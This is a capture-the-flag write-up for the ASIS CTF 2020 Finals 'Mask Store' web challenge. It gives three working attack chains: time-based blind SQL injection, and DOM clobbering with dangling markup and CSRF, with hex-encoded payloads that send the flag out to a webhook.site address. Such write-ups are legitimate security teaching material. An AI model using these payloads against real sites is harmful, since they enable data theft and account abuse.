## ASIS CTF 2020 - Finals - Mask Store - 12 Solves

We (**Super Guesser**) got 3 unintended solutions

**1.** Using heavy queries in SQL injection to sleep for a while then with window.open and performance.now() leak the flag character by character

**2.** With SQL injection and dom clobbering+dangling markup redirect to /profile if the query was true then our profile will load an image to our webhook

**3.** Dangling markup to spoof lastElement of the document then SQLi+ CSRF to leak the flag through /report

---

**1.** We can't use `<iframe>` because the cookie is SameSite but headless chrome allows window.open by default
```
/panel?orderid='||(select if(substr(lpad(bin(ord(s
ubstr((select flag from secrets),{Flag Index},1)))
,7,0),{Decimal Character},1)=1,1,(select count(*) 
from orders a,orders b,orders c,orders d,orders e,
orders f,orders g,orders h,orders i,orders j,order
s k,orders l,orders m,orders n,orders o,orders p,o
rders q,orders r,orders s,orders t,orders u,orders
 v,orders w,orders x,orders y,orders z,orders aa,o
rders ab,orders ac,orders ad)))#
```

window.open to open the page then if the character is correct we will get **<60** millisecond time otherwise move to another character

**2.** In profile page will change our profile picture to a webhook if it got any hit then it write to another file 
```
/panel?orderid='+union+select+1,(CASE+WHEN+((selec
t+count(*)+from+secrets+where+flag+like+'ASIS%7b%')>
0)+THEN+0x3203c6f7264657220757569643d2231333337222
07473746172743d22313630373638333938362220646573637
2697074696f6e3d22414141414141414141414141412220737
4617475733d223122203e3c2f6f726465723e3c2f6469763e3
c666f726d20616374696f6e3d222f70726f66696c652f39666
564313738362d663238372d343837662d623632332d3237643
8393762666438643222206d6574686f643d22474554223e3c6
96e70757420747970653d2268696464656e22206e616d653d2
26f726465726964223e3c696e70757420747970653d2268696
464656e22206e616d653d22737461747573222076616c75653
d226c617465223e3c2f666f726d3e3c212d2d+ELSE+0x20+EN
D)#
```

decoded hex:
```
<order uuid="1337" tstart="1607683986" description
="AAAAAAAAAAAAA" status="1" ></order></div><form a
ction="/profile/9fed1786-f287-487f-b623-27d897bfd8
d2" method="GET"><input type="hidden" name="orderi
d"><input type="hidden" name="status" value="late"
></form><!--
```

It will automatically submit the form and redirect to our /profile if the character guessing is right after every window.open wait 2 seconds and check our webhook to see if we got a hit

**3.** Using `</div><form method=post action="/report"><form><input name=url value=><input value="` we can can override `document.body.lastElementChild.children[parseInt(1)];` and `form.children[0].value` then changing the form path to `/report` with the SQLi write the flag to end of our supplied URL that the admin will visit
```
/panel?orderid=' union select 1,concat(0x203c6f726
4657220757569643d2226237836383b747470733a2f2f77656
2686f6f6b2e736974652f32623862616466652d666432612d3
46265342d383630322d6466316234306636333166303f70726
f6669743d31,flag,0x22207473746172743d2231363037363
83339383622206465736372697074696f6e3d2241414141414
14141414141414122207374617475733d223122203e3c2f6f7
26465723e3c2f6469763e3c666f726d206d6574686f643d706
f737420616374696f6e3d222f7265706f7274223e3c666f726
d3e3c696e707574206e616d653d75726c2076616c75653d3e3
c696e707574206e616d653d666c61672076616c75653d22) f
rom secrets#
```

decoded:
```
<order uuid="&#x68;ttps://webhook.site/2b8badfe-fd
2a-4be4-8602-df1b40f631f0?profit={The Flag we got 
with SQLi}

" tstart="1607683986" description="AAA
AAAAAAAAAA" status="1" ></order></div><form method
=post action="/report"><form><input name=url value
=><input name=flag value="
```
*Thanks 💜*
